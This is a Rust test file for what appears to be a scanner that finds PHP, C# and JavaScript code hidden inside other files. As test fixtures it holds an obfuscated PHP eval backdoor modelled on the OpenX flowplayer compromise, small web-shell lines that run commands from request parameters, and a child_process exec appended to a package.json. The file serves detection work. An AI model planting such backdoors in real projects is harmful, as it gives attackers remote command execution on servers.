use super::*;
use crate::OpenOptions;

/// The `(language, text)` of each `source.embedded` entry in `source`.
fn embedded(source: &str) -> Vec<(String, String)> {
    let parsed = OpenOptions::new()
        .path(std::path::Path::new("input.js"))
        .open(source.as_bytes());
    let Some(list) = parsed
        .values()
        .as_json()
        .pointer("/embedded/sources")
        .and_then(JsonValue::as_array)
        .cloned()
    else {
        return Vec::new();
    };
    list.iter()
        .map(|entry| {
            let at = |key: &str| entry[key].as_u64().unwrap() as usize;
            let (offset, size) = (at("offset"), at("size"));
            (
                entry["language"].as_str().unwrap().to_string(),
                source[offset..offset + size].to_string(),
            )
        })
        .collect()
}

/// The PHP blocks of `s`, as text.
fn blocks(s: &str) -> Vec<&str> {
    php_blocks(s.as_bytes())
        .into_iter()
        .map(|(offset, size)| &s[offset..offset + size])
        .collect()
}

#[test]
fn carves_the_openx_flowplayer_block_from_a_string_literal() {
    // OpenX 2.8.10, flowplayer-3.1.1.min.js, abridged: a string
    // assignment wraps the block, so the JavaScript still parses, and the
    // block decodes its callee names from comment-split literals.
    let block = "<?php /*if(e){jQuery.tools=jQuery.tools||{};*/$j='ex'./**/'plode'; \
                 $_=$j(',','strr'./*o.returnValue=false;*/'ev,str_r'.'ot13,vas'.'tPlayer');\
                 eval/*for(var p in q)*/($_[1]($_[0]($_POST[$_[2]]))); ?>";
    let js = format!(
        "m(document.getElementsByTagName(p),function(){{undefinedType=\"jQuery.fn.flashembed=function(k,j){{l=flashembed(this,k,j)}}{block}\";if(o){{r.push(this)}}}});"
    );
    let found = php_blocks(js.as_bytes());
    assert_eq!(found.len(), 1);
    assert_eq!(&js[found[0].0..found[0].0 + found[0].1], block);
    assert_eq!(Some(found[0].0), js.find("<?php"));
}

#[test]
fn reads_tags_as_php_does() {
    // Case-insensitive, whitespace required after the name, the echo tag,
    // and an unclosed block running to the end of the file.
    assert_eq!(
        blocks("a();\n<?PHP\nsystem($_GET['c']);"),
        ["<?PHP\nsystem($_GET['c']);"]
    );
    assert_eq!(blocks("a('<?= `id` ?>');"), ["<?= `id` ?>"]);
    assert_eq!(
        blocks("/* <?php x(); ?> */ b('<?php y(); ?>');"),
        ["<?php x(); ?>", "<?php y(); ?>"]
    );
    // Not tags to PHP: no whitespace after the name, or escaped.
    assert!(php_blocks(b"a('<?phpinfo ?>');").is_empty());
    assert!(php_blocks(b"const open = /<\\?php\\s/;").is_empty());
    assert!(php_blocks(b"const xml = '<?xml version=\"1.0\"?>';").is_empty());
}

#[test]
fn stops_at_the_block_cap() {
    let many = "<?php x(); ?>".repeat(MAX_PHP_BLOCKS + 3);
    assert_eq!(php_blocks(many.as_bytes()).len(), MAX_PHP_BLOCKS);
}

#[test]
fn php_blocks_reach_source_embedded() {
    assert_eq!(
        embedded("a('<?php system($_GET[1]); ?>');"),
        [("php".to_string(), "<?php system($_GET[1]); ?>".to_string())]
    );
    assert!(embedded("const plain = 1;").is_empty());
}

const CSHARP: &str = "using System; using System.Threading.Tasks; class Startup { public async Task<object> Invoke(object input) { return input; } }";

fn input(module: &str) -> String {
    format!(
        "const bridge=require('{module}'); const compiled=bridge.func(function(){{/*{CSHARP}*/}});"
    )
}

fn run(s: &str) -> Vec<String> {
    embedded(s)
        .into_iter()
        .filter(|(language, _)| language == "csharp")
        .map(|(_, text)| text)
        .collect()
}

#[test]
fn extracts_only_import_bound_comment_source() {
    for module in ["edge-js", "electron-edge-js"] {
        let values = run(&input(module));
        assert_eq!(values.len(), 1);
        assert_eq!(values[0], CSHARP);
    }
}
#[test]
fn rejects_other_module_and_plain_documentation() {
    assert!(run(&input("ordinary-lib")).is_empty());
    assert!(run(&format!("/*{}*/", input("edge-js"))).is_empty());
}
#[test]
fn rejects_alias_mutation_escape_shadow_and_require_rebinding() {
    for extra in [
        "bridge=other;",
        "bridge.func=other;",
        "send(bridge);",
        "const alias=bridge;",
        "const extra={bridge};",
        "function unrelated(bridge){}",
        "const require=custom;",
    ] {
        let s = input("edge-js").replace(" const compiled", &format!(" {} const compiled", extra));
        assert!(run(&s).is_empty(), "{extra}");
    }
}
#[test]
fn rejects_javascript_callback_bodies_and_parameters() {
    for s in [
        input("edge-js").replace("function(){", "function(input){"),
        input("edge-js").replace("/*using", "return; /*using"),
        input("edge-js").replace("bridge.func(", "other.func("),
    ] {
        assert!(run(&s).is_empty());
    }
}
#[test]
fn supports_renamed_receiver_and_bracket_member() {
    assert_eq!(
        run(&input("edge-js")
            .replace("bridge", "adapter")
            .replace("adapter.func", "adapter['func']"))
        .len(),
        1
    );
}

/// Code appended past a package.json object is an anonymous JavaScript
/// source starting where the object ends; plain trailing text is not.
#[test]
fn package_json_trailing_code_is_a_javascript_source() {
    let manifest = r#"{"name":"x","version":"1.0.0"}"#;
    let code = "\nrequire('child_process').exec('id');\n";
    let source = format!("{manifest}{code}");
    let parsed = OpenOptions::new()
        .path(std::path::Path::new("package.json"))
        .open(source.as_bytes());
    let list = parsed
        .values()
        .as_json()
        .pointer("/embedded/sources")
        .and_then(JsonValue::as_array)
        .cloned()
        .unwrap();
    assert_eq!(list.len(), 1);
    assert_eq!(list[0]["language"], "javascript");
    assert_eq!(list[0]["offset"], manifest.len());
    assert_eq!(list[0]["size"], code.len());

    let note = format!("{manifest}\n\njust a note\n");
    let parsed = OpenOptions::new()
        .path(std::path::Path::new("package.json"))
        .open(note.as_bytes());
    assert!(
        parsed
            .values()
            .as_json()
            .pointer("/embedded/sources")
            .is_none()
    );
}
